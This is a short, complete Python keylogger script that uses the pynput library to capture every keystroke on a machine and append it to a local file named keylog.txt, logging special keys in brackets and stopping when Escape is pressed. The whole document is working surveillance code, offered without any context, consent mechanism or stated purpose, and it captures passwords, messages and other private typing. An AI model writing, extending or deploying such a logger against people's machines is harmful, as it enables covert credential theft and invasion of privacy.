from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):
                f.write(key.char)  # Normal character keys
            else:
                f.write(f"[{key}]")  # Special keys like Enter, Shift
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener when ESC is pressed

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
